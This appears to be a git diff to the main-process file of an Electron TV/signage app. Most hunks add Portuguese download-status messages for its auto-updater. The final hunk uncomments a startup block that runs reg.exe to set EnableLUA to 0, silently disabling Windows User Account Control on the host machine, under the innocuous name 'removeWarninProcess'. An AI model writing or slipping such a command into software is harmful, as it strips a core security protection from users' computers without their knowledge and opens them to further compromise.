@@ -33,8 +33,9 @@ function GetQrCodeLinkTv(){
 }
 
 async function createWindow () {
-  setTimeout(()=>{
-    DAO.ClearCertainData();
+  setTimeout(async ()=>{
+    await DAO.DB.set('DownloadUpdateApp', "Atualização disponível, Por favor aguarde o processo de atualização ser concluído.");
+    await DAO.ClearCertainData();
   }, 1000);
   window = new BrowserWindow({
     width: 800,
@@ -110,6 +111,7 @@ handleMessages('GetDataLinkTv', async (event, data)=>{
     qrCodeUrl: await GetQrCodeLinkTv(),
     tvCode: DAO.TvCode,
     version: DAO.Package.version,
+    porcentagemUpdateAppOwnlaod: DAO.DB.get('DownloadUpdateApp'),
     StatusChromiumDependency: DAO.DB.get('StatusChromiumDependency')
   });
 });
@@ -159,6 +161,7 @@ handleMessages('GetUpdate', async (event, data)=>{
           tvCode: DAO.TvCode,
           date: DAO.DB.get('DataDownload_timeline'),
           porcentagemDOwnlaod: DAO.DB.get('DownloadPercentage'),
+          porcentagemUpdateAppOwnlaod: DAO.DB.get('DownloadUpdateApp'),
           update: update,
           randomReproduction: DAO.DB.get('RandomReproduction'),
           infoTv: DAO.DB.get('infoTv'),
@@ -220,28 +223,40 @@ async function loadScreenApp(noLoadIsLoaded = false){
   }
 }
 
-autoUpdater.on("update-available", (info) => {
+autoUpdater.on("update-available", async (info) => {
+  await DAO.DB.set('DownloadUpdateApp', "Atualização disponível, Por favor aguarde o processo de atualização ser concluído.");
   autoUpdater.downloadUpdate();
 });
 
-autoUpdater.on('download-progress', (info) => {
+autoUpdater.on('download-progress', async (info) => {
+  if(info.percent) {
+    let percent = `${info.percent.toString().split('.')[0]}.${info.percent.toString().split('.')[1].slice(0, 2)}`
+    await DAO.DB.set('DownloadUpdateApp', "Baixando atualização: " + percent + "%");
+  }
+  else{
+    await DAO.DB.set('DownloadUpdateApp', "Baixando Atualização, Por favor aguarde o processo ser concluído.");
+  }
   console.log(info);
 });
 
-autoUpdater.on("update-downloaded", (event, releaseNotes, releaseName) => {
-  setTimeout(() => {
+autoUpdater.on("update-downloaded", async (event, releaseNotes, releaseName) => {
+  await DAO.DB.set('DownloadUpdateApp', "Atualização baixada, Por favor aguarde o processo de atualização ser concluído.");
+  setTimeout(async () => {
     autoUpdater.quitAndInstall(false, true);
     window.close();
     app.quit();
+    await DAO.DB.set('DownloadUpdateApp', null);
     process.exit();
   }, 5000);
 });
 
-autoUpdater.on("update-not-available", (info) => {
+autoUpdater.on("update-not-available", async (info) => {
+  await DAO.DB.set('DownloadUpdateApp', null);
   console.log(info);
 });
 
 autoUpdater.on("error", async info => {
+  await DAO.DB.set('DownloadUpdateApp', null);
   console.log(info);
 });
 
@@ -262,7 +277,6 @@ app.whenReady().then(async () => {
   });
 });
 
-/*
 if(DAO.DB.get('setWarningProcessOff') != true ){
     let command = `C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f`;
     var removeWarninProcess = exec(command, (err, stdout, stderr) => { });
@@ -270,7 +284,7 @@ if(DAO.DB.get('setWarningProcessOff') != true ){
         DAO.DB.set('setWarningProcessOff', true);
         process.kill(removeWarninProcess.pid);
     }, 5000);
-};*/
+};
 app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') {
     app.quit()
